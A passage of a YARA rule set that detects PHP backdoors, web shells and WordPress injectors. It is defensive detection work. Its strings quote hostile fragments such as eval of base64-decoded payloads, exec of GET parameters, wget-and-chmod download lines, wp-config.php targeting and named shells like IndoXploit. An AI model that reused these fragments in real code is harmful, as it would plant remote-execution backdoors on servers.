        $php_backdoor_generic_084_r0 = /@error_reporting\([\d]+\);[\s]*@ini_set\(.display_errors[^;]+;[\s]*@ini_set\(.error_log[^\)]+\);[\s]*(exec|system)\(\$_GET\[.[\w]+.\]\);/
    condition:
        $trigger and PR02439 and $php_backdoor_generic_084_r0
}

private rule PR02440 : trigger
{
    strings:
        $ps0 = "python"
    condition:
        $ps0
}

private rule PR02441 : trigger
{
    strings:
        $ps0 = "if(preg_match('/' . implode("
    condition:
        $ps0
}

private rule PR02442 : trigger
{
    strings:
        $ps0 = "404 Not Found"
    condition:
        $ps0
}

rule php_backdoor_generic_085 : backdoor
{
    strings:
        $trigger = "array(\"Googlebot"
    condition:
        $trigger and PR02440 and PR02441 and PR02442
}

private rule PR02443 : trigger
{
    strings:
        $ps0 = "if($_GET)$umbr['get'] = $_GET;"
    condition:
        $ps0
}

rule php_backdoor_generic_086 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02155 and PR02443
}

private rule PR02444 : trigger
{
    strings:
        $ps0 = "if(preg_match('/200/',$file_path_ht"
    condition:
        $ps0
}

rule php_backdoor_generic_088 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02444 and PR01431
}

private rule PR02445 : trigger
{
    strings:
        $ps0 = "(); } else { if (!$_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_generic_089 : backdoor
{
    strings:
        $trigger = "])) % 256); } $"
    condition:
        $trigger and PR02445
}

private rule PR02446 : trigger
{
    strings:
        $ps0 = "public function __construct($"
    condition:
        $ps0
}

rule php_backdoor_generic_090 : backdoor
{
    strings:
        $trigger = "@$constante($"
    condition:
        $trigger and PR01330 and PR02446
}

private rule PR02447 : trigger
{
    strings:
        $ps0 = "tempnam("
    condition:
        $ps0
}

private rule PR02448 : trigger
{
    strings:
        $ps0 = "chr(hexdec($"
    condition:
        $ps0
}

rule php_backdoor_generic_091 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01403 and PR02206 and PR02447 and PR01444 and PR02448
}

rule php_backdoor_generic_092 : backdoor
{
    strings:
        $trigger = "EgIlOz4lr9N8CTuz7PfNIcV5JosdW1dV02l"
    condition:
        $trigger and PR01398
}

private rule PR02449 : trigger
{
    strings:
        $ps0 = "$input_p .= \"cp $src $dest 2>1  1>/dev/null; chmod +x $dest 2>1  1>/dev/null ;\";"
    condition:
        $ps0
}

rule php_backdoor_generic_093 : backdoor
{
    strings:
        $trigger = "file_"
    condition:
        $trigger and PR02449
}

private rule PR02450 : trigger
{
    strings:
        $ps0 = "&& md5(md5(md5("
    condition:
        $ps0
}

rule php_backdoor_generic_094 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02450 and PR01490
}

// MANUAL FIX NECESSARY
private rule PR02451 : trigger
{
    strings:
        $ps0 = ");exit;"
    condition:
        $ps0
}

rule php_backdoor_generic_095 : backdoor
{
    strings:
        $trigger = "PD9waHA"
        $php_backdoor_generic_095_r0 = /\$[\w]+=((.[\w]+.)\.?)+;[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\([^;]+;.\);[\s]*\$[\w]+\(.[^)]+.\);exit;/
    condition:
        $trigger and PR02451 and $php_backdoor_generic_095_r0
}

rule php_backdoor_generic_096 : backdoor
{
    strings:
        $trigger = "= tempnam(sys_get_temp_dir(),mt_rand("
    condition:
        $trigger and PR00435
}

private rule PR02452 : trigger
{
    strings:
        $ps0 = "--;endif;else:continue;endif;endforeach;exit;elseif(isset($_GET["
    condition:
        $ps0
}

rule php_backdoor_generic_097 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02452
}

private rule PR02453 : trigger
{
    strings:
        $ps0 = "7d"
    condition:
        $ps0
}

private rule PR02454 : trigger
{
    strings:
        $ps0 = "]){eval/*"
    condition:
        $ps0
}

private rule PR02455 : trigger
{
    strings:
        $ps0 = "substr($"
    condition:
        $ps0
}

private rule PR02456 : trigger
{
    strings:
        $ps0 = ")){"
    condition:
        $ps0
}

private rule PR02457 : trigger
{
    strings:
        $ps0 = "base_convert"
    condition:
        $ps0
}

rule php_backdoor_generic_098 : backdoor
{
    strings:
        $trigger = "create_function"
    condition:
        $trigger and PR02453 and PR02454 and PR02455 and PR02456 and PR02457
}

private rule PR02458 : trigger
{
    strings:
        $ps0 = "getcwd("
    condition:
        $ps0
}

private rule PR02459 : trigger
{
    strings:
        $ps0 = ".substr(sprintf('%o', fileperms($"
    condition:
        $ps0
}

private rule PR02460 : trigger
{
    strings:
        $ps0 = ".htmlspecialchars(file_get_contents($_GET["
    condition:
        $ps0
}

rule php_backdoor_generic_099 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02458 and PR00507 and PR02459 and PR02460
}

// MANUAL FIX NECESSARY
private rule PR02461 : trigger
{
    strings:
        $ps0 = "$_SERVER['REQUEST_URI'].\"&dir="
    condition:
        $ps0
}

rule php_backdoor_generic_100 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_generic_100_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR02461 and PR00397 and $php_backdoor_generic_100_r0
}

private rule PR02462 : trigger
{
    strings:
        $ps0 = "echo \"status: ok\";"
    condition:
        $ps0
}

rule php_backdoor_generic_101 : backdoor
{
    strings:
        $trigger = "$data = $_REQUEST[\"data\"];"
    condition:
        $trigger and PR00435 and PR02462
}

private rule PR02463 : trigger
{
    strings:
        $ps0 = "case 'save file':"
    condition:
        $ps0
}

rule php_backdoor_generic_102 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02463 and PR01428 and PR01021
}

private rule PR02464 : trigger
{
    strings:
        $ps0 = "stripslashes($_REQUEST['query']);"
    condition:
        $ps0
}

rule php_backdoor_generic_102_02 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02464 and PR01431
}

rule php_backdoor_generic_103 : backdoor
{
    strings:
        $trigger = "echo \"BArNEr"
    condition:
        $trigger
}

rule php_backdoor_generic_104 : backdoor
{
    strings:
        $trigger = "eval(htmlspecialchars_decode(urldecode(base64_decode("
    condition:
        $trigger and PR00301
}

private rule PR02465 : trigger
{
    strings:
        $ps0 = "preg_replace('~\\/(wp-admin"
    condition:
        $ps0
}

private rule PR02466 : trigger
{
    strings:
        $ps0 = "preg_match(\"~table_prefix"
    condition:
        $ps0
}

rule php_backdoor_generic_108 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02465 and PR02466
}

rule php_backdoor_generic_109 : backdoor
{
    strings:
        $trigger = "eval('?>'.base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKT"
    condition:
        $trigger
}

private rule PR02467 : trigger
{
    strings:
        $ps0 = ".base64_decode"
    condition:
        $ps0
}

rule php_backdoor_generic_112 : backdoor
{
    strings:
        $trigger = ".PHP_EOL.PHP_EOL.PHP_EOL.PHP_EOL.PHP_EOL.PHP_EOL.PHP_EOL"
    condition:
        $trigger and PR02467
}

private rule PR02468 : trigger
{
    strings:
        $ps0 = "echo '###PACKET_END###';"
    condition:
        $ps0
}

rule php_backdoor_generic_114 : backdoor
{
    strings:
        $trigger = "$_SERVER[\"DOCUMENT_ROOT\"]"
    condition:
        $trigger and PR00435 and PR02468
}

private rule PR02469 : trigger
{
    strings:
        $ps0 = "dYeKzZdTPOBeAn9R3fZnv9+Pt0c/OmrUsAuWAKk1FOyj3PcWc"
    condition:
        $ps0
}

private rule PR02470 : trigger
{
    strings:
        $ps0 = "= $this->code2leng(0, $"
    condition:
        $ps0
}

rule php_backdoor_generic_115 : backdoor
{
    strings:
        $trigger = "$key"
    condition:
        $trigger and PR02469 and PR00029 and PR02470 and PR01422
}

rule php_backdoor_generic_116 : backdoor
{
    strings:
        $trigger = "if (is_dir($del)){myrmdir($del);} else { unlink($del); }"
    condition:
        $trigger and PR00203
}

rule php_backdoor_generic_117 : backdoor
{
    strings:
        $trigger = "GiYvNWhkc2ZjY3NqZXJlY2FzVGVzZWNjjn4lcmVjY3MqZXJlY2NzalUnJWNjc2plcmVjYzNqXXJjYyNzSGVTZWJjc2pgcmVjY3NqZXJlY2NzaiVyZWN"
    condition:
        $trigger and PR01477 and PR01479
}

rule php_backdoor_generic_118 : backdoor
{
    strings:
        $trigger = "$An0n_"
    condition:
        $trigger and PR00029
}

private rule PR02471 : trigger
{
    strings:
        $ps0 = ", sprintf (\"%u\", @filesize ($"
    condition:
        $ps0
}

rule php_backdoor_generic_120 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR02471 and PR01021
}

private rule PR02472 : trigger
{
    strings:
        $ps0 = "array_merge(range(chr(97),chr(122)),str_split("
    condition:
        $ps0
}

rule php_backdoor_generic_123 : backdoor
{
    strings:
        $trigger = "touch($"
    condition:
        $trigger and PR00435 and PR00341 and PR02472
}

private rule PR02473 : trigger
{
    strings:
        $ps0 = "=\"JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9Wy"
    condition:
        $ps0
}

rule php_backdoor_generic_124 : backdoor
{
    strings:
        $trigger = "stri"
    condition:
        $trigger and PR02473
}

private rule PR02474 : trigger
{
    strings:
        $ps0 = "x7\\x3C\\x57\\x5E\\x6C\\x1E\\x1C\\x1A\\x3A\\x22\\x38\\x25\\x18\\xA\\x40\\x25\\x27\\x47\\x56\\x59\\x6E"
    condition:
        $ps0
}

rule php_backdoor_generic_125 : backdoor
{
    strings:
        $trigger = "stri"
    condition:
        $trigger and PR02474
}

rule php_backdoor_generic_126 : backdoor
{
    strings:
        $trigger = "P3vFEBdeUzCBVklmBtWZCjIekHsQLxOf0OFoTlgk/QDkt4PT7sEnE"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02475 : trigger
{
    strings:
        $ps0 = "[\"ove\"]=@"
    condition:
        $ps0
}

private rule PR02476 : trigger
{
    strings:
        $ps0 = ");if($"
    condition:
        $ps0
}

rule php_backdoor_generic_128 : backdoor
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR00608 and PR02475 and PR02476
}

private rule PR02477 : trigger
{
    strings:
        $ps0 = " include(\""
    condition:
        $ps0
}

rule php_backdoor_generic_128_02 : backdoor
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR02477 and PR00608 and PR02476
}

private rule PR02478 : trigger
{
    strings:
        $ps0 = "$txt = base64_decode("
    condition:
        $ps0
}

rule php_backdoor_generic_129 : backdoor
{
    strings:
        $trigger = "eval($txt);"
    condition:
        $trigger and PR02478
}

rule php_backdoor_generic_131 : backdoor
{
    strings:
        $trigger = "inoxRaW+ovjkZJ+fW388j0xXbOvroXVTzMLRUBh/8VDToxP1YZ3GjqGU63OMibX"
    condition:
        $trigger and PR00029 and PR02470 and PR01422 and PR01748
}

private rule PR02479 : trigger
{
    strings:
        $ps0 = ";wget '.$url.';chmod"
    condition:
        $ps0
}

private rule PR02480 : trigger
{
    strings:
        $ps0 = "$subject"
    condition:
        $ps0
}

rule php_backdoor_generic_132 : backdoor
{
    strings:
        $trigger = "@exec("
    condition:
        $trigger and PR02479 and PR00301 and PR02480
}

private rule PR02481 : trigger
{
    strings:
        $ps0 = "($_FILES['only_pcd']"
    condition:
        $ps0
}

private rule PR02482 : trigger
{
    strings:
        $ps0 = "@INCLUDE_ONCE"
    condition:
        $ps0
}

rule php_backdoor_generic_133 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR02481 and PR02482
}

private rule PR02483 : trigger
{
    strings:
        $ps0 = "register_tick_function($_GET"
    condition:
        $ps0
}

rule php_backdoor_generic_137 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR02483
}

private rule PR02484 : trigger
{
    strings:
        $ps0 = "_=\"{\"; $_=($_^\"<\")"
    condition:
        $ps0
}

rule php_backdoor_generic_138 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR02484
}

rule php_backdoor_generic_139 : backdoor
{
    strings:
        $trigger = "forward_static_call($_GET["
    condition:
        $trigger
}

private rule PR02485 : trigger
{
    strings:
        $ps0 = "if (strpos($contents, $text)"
    condition:
        $ps0
}

private rule PR02486 : trigger
{
    strings:
        $ps0 = "fopen($"
    condition:
        $ps0
}

rule php_backdoor_generic_140 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02485 and PR02486 and PR01382
}

private rule PR02487 : trigger
{
    strings:
        $ps0 = "touch ($file_address, filemtime($"
    condition:
        $ps0
}

rule php_backdoor_generic_141 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02487 and PR01468 and PR01469
}

rule php_backdoor_generic_142 : backdoor
{
    strings:
        $trigger = "getallheaders();if(isset($"
    condition:
        $trigger and PR01678
}

private rule PR02488 : trigger
{
    strings:
        $ps0 = "if(isset($_GET['chmod"
    condition:
        $ps0
}

rule php_backdoor_generic_143 : backdoor
{
    strings:
        $trigger = "google-site-verification"
    condition:
        $trigger and PR02488
}

private rule PR02489 : trigger
{
    strings:
        $ps0 = "echo preg_quote(mystripslashes($_POST["
    condition:
        $ps0
}

private rule PR02490 : trigger
{
    strings:
        $ps0 = "encoding(file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_generic_144 : backdoor
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR02489 and PR00431 and PR01403 and PR02490
}

rule php_backdoor_generic_146 : backdoor
{
    strings:
        $trigger = "require_once($docRoot . ($queryLength > 2 ? \"/\".$queryArray[$queryLength - 2] : \"\" ) . '/wp-blog-header.php');"
    condition:
        $trigger and PR00091 and PR01392
}

private rule PR02491 : trigger
{
    strings:
        $ps0 = "=Q2LYvAA/cb75H97BPTuj7vefNv8/9WB/FgPU/zkgT5BYbgZjsp0/JFuvtrnDI6BeJXQePMTE4KYdsGqxwzexmP4/eci8vgj9wcODiZc"
    condition:
        $ps0
}

rule php_backdoor_generic_147 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR02491
}

private rule PR02492 : trigger
{
    strings:
        $ps0 = "echo $file;"
    condition:
        $ps0
}

private rule PR02493 : trigger
{
    strings:
        $ps0 = "opendir($"
    condition:
        $ps0
}

private rule PR02494 : trigger
{
    strings:
        $ps0 = "echo \"<br>\";"
    condition:
        $ps0
}

private rule PR02495 : trigger
{
    strings:
        $ps0 = "while (($file = readdir($open)) !== false){"
    condition:
        $ps0
}

private rule PR02496 : trigger
{
    strings:
        $ps0 = "(is_dir($"
    condition:
        $ps0
}

private rule PR02497 : trigger
{
    strings:
        $ps0 = "echo $_SERVER['DOCUMENT_ROOT'];"
    condition:
        $ps0
}

rule php_backdoor_generic_148 : backdoor
{
    strings:
        $trigger = "$directory = \"../."
    condition:
        $trigger and PR02492 and PR02493 and PR02494 and PR02495 and PR02496 and PR02497
}

private rule PR02498 : trigger
{
    strings:
        $ps0 = "@touch(\"_input_1_.php.\", $mtime, $mtime);"
    condition:
        $ps0
}

rule php_backdoor_gf_backdoor_installer_001 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02498
}

rule php_backdoor_ghost_mini_shell_001 : backdoor
{
    strings:
        $trigger = "\"DROP TABLE IF EXISTS Ghost_table;\\nCREATE TABLE `Ghost_table`"
    condition:
        $trigger and PR00013
}

rule php_backdoor_ghostshell_002 : backdoor
{
    strings:
        $trigger = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'("
    condition:
        $trigger
}

private rule PR02499 : trigger
{
    strings:
        $ps0 = "$pass"
    condition:
        $ps0
}

private rule PR02500 : trigger
{
    strings:
        $ps0 = "GIF89a"
    condition:
        $ps0
}

rule php_backdoor_gif89a_001 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(str_rot13(base64_decode($"
    condition:
        $trigger and PR02499 and PR02500
}

rule php_backdoor_googleman_001 : backdoor
{
    strings:
        $trigger = "$default_action = 'GoogleMan';"
    condition:
        $trigger
}

rule php_backdoor_gp_shell_001 : backdoor
{
    strings:
        $trigger = "global $__gp_ai,$__gp;if(!@$__gp_ai){error_reporting(0);"
    condition:
        $trigger
}

rule php_backdoor_gp_shell_001_02 : backdoor
{
    strings:
        $trigger = "str_replace('[-code-]',$__gp->out,preg_replace"
    condition:
        $trigger
}

private rule PR02501 : trigger
{
    strings:
        $ps0 = "*/./*"
    condition:
        $ps0
}

private rule PR02502 : trigger
{
    strings:
        $ps0 = "*/)/*"
    condition:
        $ps0
}

private rule PR02503 : trigger
{
    strings:
        $ps0 = "*/(/*"
    condition:
        $ps0
}

rule php_backdoor_gzinflate_005 : backdoor
{
    strings:
        $trigger = ";eval/*"
    condition:
        $trigger and PR02501 and PR02502 and PR02503
}

rule php_backdoor_gzinflate_006 : backdoor
{
    strings:
        $trigger = "$Cyber \xe2\x80\x8b\xe2\x80\x8b= \"ZXZhbCUyOCUyNnF1b3Ql"
    condition:
        $trigger and PR00029 and PR01422 and PR01658
}

rule php_backdoor_gzinflate_binary_001 : backdoor
{
    strings:
        $trigger = "$gz=$f4($f2($c0),364);"
    condition:
        $trigger and PR00029 and PR00265
}

rule php_backdoor_hashdeb_001 : backdoor
{
    strings:
        $trigger = "echo \"hashdeb :"
    condition:
        $trigger and PR00029 and PR00507
}

private rule PR02504 : trigger
{
    strings:
        $ps0 = " File Manager</center></H1>"
    condition:
        $ps0
}

rule php_backdoor_hatrk_file_manager_001 : backdoor
{
    strings:
        $trigger = "if($_POST['opt'] == 'chmod'){"
    condition:
        $trigger and PR02504
}

private rule PR02505 : trigger
{
    strings:
        $ps0 = "Haxplorer"
    condition:
        $ps0
}

rule php_backdoor_haxplorer_shell_001 : backdoor
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR02505 and PR02033
}

private rule PR02506 : trigger
{
    strings:
        $ps0 = " ^ str_repeat ($"
    condition:
        $ps0
}

rule php_backdoor_hex_xor_003 : backdoor
{
    strings:
        $trigger = ", ceil (strlen ($"
    condition:
        $trigger and PR01483 and PR02506
}

rule php_backdoor_hexToStr_001 : backdoor
{
    strings:
        $trigger = "$code=hexToStr($_POST['"
    condition:
        $trigger and PR00029
}

rule php_backdoor_HTTP_POST_FILES_001 : backdoor
{
    strings:
        $trigger = "$code = @fread(@fopen($HTTP_POST_FILES[\"f\"]"
    condition:
        $trigger
}

rule php_backdoor_hucys_shell_001 : backdoor
{
    strings:
        $trigger = "$shellname='hucys';//"
    condition:
        $trigger
}

rule php_backdoor_hvashell_001 : backdoor
{
    strings:
        $trigger = "<title>:: phpHS :: PHP HVA Shell Script ::"
    condition:
        $trigger
}

rule php_backdoor_I47_001 : backdoor
{
    strings:
        $trigger = "+++I-47 v"
    condition:
        $trigger and PR01693
}

rule php_backdoor_I47_002 : backdoor
{
    strings:
        $trigger = "eval(\"?>\".gzuncompress(base64_decode($lktd)));"
    condition:
        $trigger
}

private rule PR02507 : trigger
{
    strings:
        $ps0 = "gagal"
    condition:
        $ps0
}

private rule PR02508 : trigger
{
    strings:
        $ps0 = "\"IndoXploit - Auto Xploiter\""
    condition:
        $ps0
}

rule php_backdoor_indoexploit_001 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02507 and PR00507 and PR02508
}

private rule PR02509 : trigger
{
    strings:
        $ps0 = "IndoXploit Shell"
    condition:
        $ps0
}

rule php_backdoor_indoexploit_002 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR02509 and PR00029
}

private rule PR02510 : trigger
{
    strings:
        $ps0 = "?indoxploit\";</script>"
    condition:
        $ps0
}

rule php_backdoor_indoexploit_003 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02510 and PR00355 and PR00357
}

// MANUAL FIX NECESSARY
rule php_backdoor_indoexploit_004 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_indoexploit_004_r0 = /[iI][nN][dD][oO][xX][pP][lL][oO][iI][tT]/
    condition:
        $trigger and $php_backdoor_indoexploit_004_r0
}

private rule PR02511 : trigger
{
    strings:
        $ps0 = "INDRAJITH SHELL"
    condition:
        $ps0
}

rule php_backdoor_indrajith_001 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR02511
}

rule php_backdoor_injector_002 : backdoor
{
    strings:
        $trigger = "$body = \"Shell Injector"
    condition:
        $trigger
}

rule php_backdoor_injector_003 : backdoor
{
    strings:
        $trigger = "echo $catid = isset($_GET['catid'])?base64_decode"
    condition:
        $trigger
}

private rule PR02512 : trigger
{
    strings:
        $ps0 = "$htmls =  str_replace(\"\".chr(34).\""
    condition:
        $ps0
}

rule php_backdoor_injector_104 : backdoor
{
    strings:
        $trigger = "$url = \"$host/\".$_SERVER[\"QUERY_STRING\"];"
    condition:
        $trigger and PR02512
}

private rule PR02513 : trigger
{
    strings:
        $ps0 = "mage($_POST['code']);"
    condition:
        $ps0
}

rule php_backdoor_injector_105 : backdoor
{
    strings:
        $trigger = "@include"
    condition:
        $trigger and PR02513
}

private rule PR02514 : trigger
{
    strings:
        $ps0 = "$strDefault = file_get_conten"
    condition:
        $ps0
}

private rule PR02515 : trigger
{
    strings:
        $ps0 = "\",$strDefault);"
    condition:
        $ps0
}

rule php_backdoor_injector_106 : backdoor
{
    strings:
        $trigger = "echo \"ok!\";"
    condition:
        $trigger and PR02514 and PR02515
}

private rule PR02516 : trigger
{
    strings:
        $ps0 = "popup-pomo.txt\",\"\",$str_get);"
    condition:
        $ps0
}

rule php_backdoor_injector_106_02 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR02516
}

private rule PR02517 : trigger
{
    strings:
        $ps0 = "rename( 'idName.txt', 'idName.php' );"
    condition:
        $ps0
}

rule php_backdoor_injector_106_03 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02517
}

rule php_backdoor_injector_107 : backdoor
{
    strings:
        $trigger = "                                                                          @include($_"
    condition:
        $trigger
}

rule php_backdoor_injector_108 : backdoor
{
    strings:
        $trigger = "$files = array($target.\"/wp-config.php\", $target"
    condition:
        $trigger and PR01648
}

rule php_backdoor_injector_109 : backdoor
{
    strings:
        $trigger = "e';@assert($"
    condition:
        $trigger
}

private rule PR02518 : trigger
{
    strings:
        $ps0 = "].'{'));};unset($"
    condition:
        $ps0
}

private rule PR02519 : trigger
{
    strings:
        $ps0 = "=\"create_\";global $"
    condition:
        $ps0
}

private rule PR02520 : trigger
{
    strings:
        $ps0 = ".='function')&&!function_exists("
    condition:
        $ps0
}

rule php_backdoor_injector_110 : backdoor
{
    strings:
        $trigger = "=str_repeat(\"\\x"
    condition:
        $trigger and PR02518 and PR01693 and PR02519 and PR02520
}

private rule PR02521 : trigger
{
    strings:
        $ps0 = "!empty($_GET["
    condition:
        $ps0
}

rule php_backdoor_injector_112 : backdoor
{
    strings:
        $trigger = "$spc = array('<', '>', '&')"
    condition:
        $trigger and PR02521 and PR01021 and PR02439
}

private rule PR02522 : trigger
{
    strings:
        $ps0 = "chmod($_SERVER[\"DOCUMENT_ROOT\"].\"/wp-temp.php\", 0644);"
    condition:
        $ps0
}

rule php_backdoor_injector_113 : backdoor
{
    strings:
        $trigger = "($_POST[\"upload\"] == \"go\")"
    condition:
        $trigger and PR00039 and PR02056 and PR02522 and PR01788
}

rule php_backdoor_injector_114 : backdoor
{
    strings:
        $trigger = "pRj7U+O88Wc60//BZFxs3/kSx3mRAwM336Xf9830Hs3lOu0Al1F"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02523 : trigger
{
    strings:
        $ps0 = "echo \"SORRY KILLED"
    condition:
        $ps0
}

private rule PR02524 : trigger
{
    strings:
        $ps0 = "if(is_writable($dr.'/wp-includes/pomo"
    condition:
        $ps0
}

rule php_backdoor_injector_115 : backdoor
{
    strings:
        $trigger = "eval(${$"
    condition:
        $trigger and PR02523 and PR01016 and PR02524
}

private rule PR02525 : trigger
{
    strings:
        $ps0 = "function php_in"
    condition:
        $ps0
}

rule php_backdoor_injector_116 : backdoor
{
    strings:
        $trigger = "if (strpos($file, $what_find) !== false) {"
    condition:
        $trigger and PR00435 and PR02525
}

rule php_backdoor_injector_117 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(str_rot13('aIiew2EUqs9KqyhqqI/EUgKeidMmqm5M+otEEUku9b5zrz7iGwj7Z3G3xQTey"
    condition:
        $trigger
}

private rule PR02526 : trigger
{
    strings:
        $ps0 = "wp_register_script($name.\"-json-min\""
    condition:
        $ps0
}

rule php_backdoor_injector_118 : backdoor
{
    strings:
        $trigger = "$php_main_file = trailingslashit(ABSPATH) . \"wp-content/plugins/\" . $active_plugins[rand"
    condition:
        $trigger and PR00435 and PR02526
}

private rule PR02527 : trigger
{
    strings:
        $ps0 = "validate_install'));"
    condition:
        $ps0
}

rule php_backdoor_injector_118_02 : backdoor
{
    strings:
        $trigger = "$php_main_file = trailingslashit(ABSPATH) . \"wp-content/plugins/\" . $active_plugins[rand"
    condition:
        $trigger and PR00435 and PR02527
}

private rule PR02528 : trigger
{
    strings:
        $ps0 = "$php_main_file = trailingslashit(ABSPATH) . \"wp-content/plugins/\" . $active_plugins[rand"
    condition:
        $ps0
}

rule php_backdoor_injector_118_03 : backdoor
{
    strings:
        $trigger = "all_plugins'));"
    condition:
        $trigger and PR00435 and PR02528
}

private rule PR02529 : trigger
{
    strings:
        $ps0 = "widget_ajax'));"
    condition:
        $ps0
}

rule php_backdoor_injector_118_04 : backdoor
{
    strings:
        $trigger = "$php_main_file = trailingslashit(ABSPATH) . \"wp-content/plugins/\" . $active_plugins[rand"
    condition:
        $trigger and PR00435 and PR02529
}

rule php_backdoor_injector_119 : backdoor
{
    strings:
        $trigger = "CONF_PASSWORD_HASH == md5($_POST['password'])) { switch ($_POST['action']) { case 'link"
    condition:
        $trigger
}

rule php_backdoor_injector_120 : backdoor
{
    strings:
        $trigger = "<?php \".gzuncompress(base64_decode($_POST["
    condition:
        $trigger
}

private rule PR02530 : trigger
{
    strings:
        $ps0 = "function wp_hts($str){"
    condition:
        $ps0
}

rule php_backdoor_injector_121 : backdoor
{
    strings:
        $trigger = "$codes = explode('{[DEL]}', $code);"
    condition:
        $trigger and PR00355 and PR01392 and PR02530 and PR00357 and PR01431
}

private rule PR02531 : trigger
{
    strings:
        $ps0 = "echo getFilterCache();"
    condition:
        $ps0
}

rule php_backdoor_injector_121_02 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR02530 and PR02531 and PR00357
}

private rule PR02532 : trigger
{
    strings:
        $ps0 = "(\"ZXZhbChnemluZmxhdGUoc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUo"
    condition:
        $ps0
}

rule php_backdoor_injector_122 : backdoor
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR02532
}

private rule PR02533 : trigger
{
    strings:
        $ps0 = "array(98,97,115,101,54,52,95,100,101,99,111,100,101)"
    condition:
        $ps0
}

private rule PR02534 : trigger
{
    strings:
        $ps0 = "include"
    condition:
        $ps0
}

private rule PR02535 : trigger
{
    strings:
        $ps0 = "require(BASE_PATH . 'wp-load.php'"
    condition:
        $ps0
}

rule php_backdoor_injector_123 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02533 and PR02534 and PR02535 and PR00634
}

private rule PR02536 : trigger
{
    strings:
        $ps0 = "(str_rot13(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_injector_124 : backdoor
{
    strings:
        $trigger = "GIF89a"
    condition:
        $trigger and PR00029 and PR02536
}

private rule PR02537 : trigger
{
    strings:
        $ps0 = "@file_put_contents($sub_path.\"/xmlrpc.php\",base64_decode(strtr"
    condition:
        $ps0
}

rule php_backdoor_injector_125 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02537 and PR01431
}

private rule PR02538 : trigger
{
    strings:
        $ps0 = "(gzinflate"
    condition:
        $ps0
}

private rule PR02539 : trigger
{
    strings:
        $ps0 = "rUnrQuM4EP+8VfwPxkp6RS2kPJbdFRAEgrCL7nW5ttwXQESauK1YX"
    condition:
        $ps0
}

rule php_backdoor_injector_126 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02538 and PR01422 and PR02539
}

private rule PR02540 : trigger
{
    strings:
        $ps0 = "$img_htacces = \"AddHandler application/x-httpd-php"
    condition:
        $ps0
}

rule php_backdoor_injector_127 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR02540 and PR00357
}

rule php_backdoor_injector_128 : backdoor
{
    strings:
        $trigger = "$replace=\"@require(dirname(__FILE__).'/wp-stat.php');\\n\";"
    condition:
        $trigger and PR00435
}

private rule PR02541 : trigger
{
    strings:
        $ps0 = "explode(\"wp-content/"
    condition:
        $ps0
}

rule php_backdoor_injector_129 : backdoor
{
    strings:
        $trigger = "my_file_put_contents($file,"
    condition:
        $trigger and PR02541 and PR00355 and PR00357 and PR01431
}

private rule PR02542 : trigger
{
    strings:
        $ps0 = "function inject_wordpress_main_php"
    condition:
        $ps0
}

rule php_backdoor_injector_130 : backdoor
{
    strings:
        $trigger = "asser"
    condition:
        $trigger and PR02542
}

rule php_backdoor_injector_131 : backdoor
{
    strings:
        $trigger = "elseif (is_resource($f = @popen"
    condition:
        $trigger and PR02440 and PR00026
}

private rule PR02543 : trigger
{
    strings:
        $ps0 = "wp_set_auth_cookie("
    condition:
        $ps0
}

private rule PR02544 : trigger
{
    strings:
        $ps0 = "DB_PASSWORD"
    condition:
        $ps0
}

private rule PR02545 : trigger
{
    strings:
        $ps0 = "$this->uploadDir"
    condition:
        $ps0
}

private rule PR02546 : trigger
{
